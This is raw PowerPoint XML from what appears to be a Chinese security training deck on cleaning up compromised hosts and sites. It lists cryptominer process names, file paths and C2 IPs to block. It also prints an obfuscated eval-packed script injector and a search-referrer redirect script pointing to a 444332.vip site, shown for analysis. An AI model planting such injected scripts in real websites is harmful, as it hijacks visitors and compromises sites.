            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>终止挖矿进程</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>下例如：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>pkill AnXqV</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>pkill ddg.222</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>pkill ddg.2020</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>pkill wnTKYg</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>下例如：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>停止</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Microsoft.NET_Framework_NGENS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>服务</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>清理挖矿相关文件</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/tmp/wnTKYg.noaes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/tmp/ddg.2020</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/root/.ddg/2020.db</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/tmp/ddg.222</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/tmp/AnXqV.yam</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/tmp/AnXqV</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/tmp/AnXqV.noaes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>等及 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>~/.ssh/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中未知授权</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>C:\Windows\debug\wk1xw</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>4.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>防火墙上封禁挖矿样本下载和外连地址：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>218.248.40.228</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>163.172.207.69</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>163.172.226.131</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>163.172.226.201</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8601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9531BBA5-0D06-46AE-B9E0-34C382DEECAD}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>213</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12735784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59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23561C40-9AB1-4C83-9945-17FD9D64DEDB}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>215</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="275679553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2"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16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AEE81013-48D7-4616-B50F-2BA2DA916C26}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>218</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15709802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AE739265-D76F-45F4-8E13-9E3476B41B45}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>220</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18255237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&lt;script type="text/javascript"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>eval(function(p,a,c,k,e,d){e=function(c){return(c&lt;a?"":e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('l["\\c\\b\\2\\m\\i\\8\\j\\0"]["\\7\\3\\9\\0\\8"](\'\\g\\1\\2\\3\\9\\4\\0 \\0\\n\\4\\8\\d\\6\\0\\8\\k\\0\\5\\f\\e\\o\\e\\1\\2\\3\\9\\4\\0\\6 \\1\\3\\2\\d\\6\\t\\0\\0\\4\\1\\r\\5\\5\\7\\7\\7\\a\\q\\1\\1\\c\\s\\2\\a\\2\\b\\i\\5\\j\\p\\a\\f\\1\\6\\h\\g\\5\\1\\2\\3\\9\\4\\0\\h\');',30,30,'x74|x73|x63|x72|x70|x2f|x22|x77|x65|x69|x2e|x6f|x64|x3d|x61|x6a|x3c|x3e|x6d|x6e|x78|window|x75|x79|x76|x62|x67|x3a|x6c|x68'.split('|'),0,{}))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>我们可以在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>chrome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>或者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>firefox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>中 使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>alert</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>或者</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>console.log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t> 去让</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>引擎去解析</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9830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465E982F-A2F7-4417-8FA4-7DD418A0E331}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>222</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="227746023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document.writeln("&lt;script LANGUAGE=\"Javascript\"&gt;");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>document.writeln("var s=document.referrer");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>document.writeln("if(s.indexOf(\"baidu\")&gt;0 || s.indexOf(\"sogou\")&gt;0 || s.indexOf(\"soso\")&gt;0 ||s.indexOf(\"sm\")&gt;0 ||s.indexOf(\"uc\")&gt;0 ||s.indexOf(\"bing\")&gt;0 ||s.indexOf(\"yahoo\")&gt;0 ||s.indexOf(\"so\")&gt;0 )");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>document.writeln("location.href=\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.444332.vip/?channel=P00142\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>";");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>document.writeln("&lt;/script&gt;");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>检查</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>referer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>是是否来自搜索引擎 如果是的话 就进行跳转</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10035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3276267B-2370-4C2E-8852-097E38E8C57D}" type="slidenum">
              <a:rPr kumimoji="0" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:pPr/>
              <a:t>223</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11211555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bg bwMode="gray">
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="accent2"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="AutoShape 103"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="2819400" y="3113088"/>
            <a:ext cx="5867400" cy="838200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:noFill/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 105"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="7696200" y="1741488"/>
            <a:ext cx="533400" cy="8382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7" name="Rectangle 106"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6934200" y="1131888"/>
            <a:ext cx="914400" cy="8382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8" name="Rectangle 107"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="8077200" y="141288"/>
            <a:ext cx="914400" cy="15240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9" name="Rectangle 108"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6553200" y="750888"/>
            <a:ext cx="533400" cy="5334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10" name="Rectangle 110"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="6324600" y="2884488"/>
            <a:ext cx="533400" cy="5334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11" name="Rectangle 114"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="3810000" y="2655888"/>
            <a:ext cx="152400" cy="152400"/>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12" name="Rectangle 120"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="4267200" y="2655888"/>
            <a:ext cx="152400" cy="152400"/>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13" name="Rectangle 124"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="4495800" y="2655888"/>
            <a:ext cx="152400" cy="152400"/>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14" name="Rectangle 126"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="4724400" y="2655888"/>
            <a:ext cx="152400" cy="152400"/>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15" name="Group 211"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4724400" y="1741488"/>
            <a:ext cx="1295400" cy="838200"/>
            <a:chOff x="2976" y="1440"/>
            <a:chExt cx="816" cy="528"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="Rectangle 104"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="144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7" name="Rectangle 125"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2976" y="1728"/>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8" name="Rectangle 127"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="158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9" name="Rectangle 128"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="1728"/>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0" name="Rectangle 129"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3120" y="1872"/>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1" name="Rectangle 130"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3264" y="158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2" name="Rectangle 131"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3264" y="1872"/>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3" name="Rectangle 132"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="144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4" name="Rectangle 133"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="158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5" name="Rectangle 134"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1728"/>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6" name="Rectangle 135"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3408" y="1872"/>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7" name="Rectangle 136"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3552" y="144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8" name="Rectangle 137"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3552" y="1728"/>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9" name="Rectangle 138"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3696" y="158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30" name="Rectangle 139"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3696" y="1728"/>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31" name="Rectangle 140"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="3696" y="1872"/>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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="32" name="Group 212"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3352800" y="1970088"/>
            <a:ext cx="1295400" cy="609600"/>
            <a:chOff x="2112" y="1584"/>
            <a:chExt cx="816" cy="384"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="33" name="Rectangle 112"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="158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34" name="Rectangle 113"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="1872"/>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35" name="Rectangle 115"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2544" y="158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36" name="Rectangle 116"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2544" y="1728"/>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37" name="Rectangle 117"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2544" y="1872"/>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38" name="Rectangle 118"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2688" y="158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39" name="Rectangle 119"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2688" y="1872"/>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0" name="Rectangle 121"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="158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1" name="Rectangle 122"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="1728"/>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2" name="Rectangle 123"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2832" y="1872"/>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3" name="Rectangle 141"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2256" y="1872"/>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4" name="Rectangle 142"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2112" y="1872"/>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grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="45" name="Group 143"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="762000" y="3570288"/>
            <a:ext cx="1905000" cy="762000"/>
            <a:chOff x="2112" y="1632"/>
            <a:chExt cx="1680" cy="672"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="46" name="Rectangle 144"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="1776"/>
              <a:ext cx="95"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7" name="Rectangle 145"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="2065"/>
              <a:ext cx="95"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8" name="Rectangle 146"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2400" y="2207"/>
              <a:ext cx="95" cy="97"/>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9" name="Rectangle 147"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2545" y="1776"/>
              <a:ext cx="95"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0" name="Rectangle 148"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2545" y="1920"/>
              <a:ext cx="95"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1" name="Rectangle 149"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2545" y="2065"/>
              <a:ext cx="95"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2" name="Rectangle 150"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2687" y="1776"/>
              <a:ext cx="97"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3" name="Rectangle 151"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2687" y="2065"/>
              <a:ext cx="97"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4" name="Rectangle 152"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2687" y="2207"/>
              <a:ext cx="97" cy="97"/>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5" name="Rectangle 153"/>
